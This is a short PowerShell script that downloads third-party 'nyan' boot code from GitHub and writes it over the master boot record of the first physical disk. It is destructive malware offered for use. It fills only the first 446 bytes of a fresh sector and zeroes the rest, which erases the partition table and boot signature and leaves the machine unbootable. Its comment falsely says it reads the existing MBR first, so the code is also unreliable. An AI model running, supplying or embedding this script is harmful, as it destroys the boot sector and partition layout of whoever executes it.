Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/brainsmoke/nyanmbr/master/nyan.mbr' -OutFile "$env:TEMP\nyan.mbr" -UseBasicParsing

# read bytes from downloaded file
$bootBytes = [System.IO.File]::ReadAllBytes("$env:TEMP\nyan.mbr")


# open physical drive 0
$fs = New-Object System.IO.FileStream(
    "\\.\PhysicalDrive0",
    [System.IO.FileMode]::Open,
    [System.IO.FileAccess]::ReadWrite,
    [System.IO.FileShare]::ReadWrite
)

try {
    # read current MBR (512 bytes)
    $sector = New-Object byte[] 512

    # copy first 446 bytes of downloaded bootcode into the sector buffer
    [Array]::Copy($bootBytes, 0, $sector, 0, 446)

    # write modified MBR back to disk
    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $fs.Write($sector, 0, 512)
    $fs.Flush()
}
finally {
    $fs.Close()
}
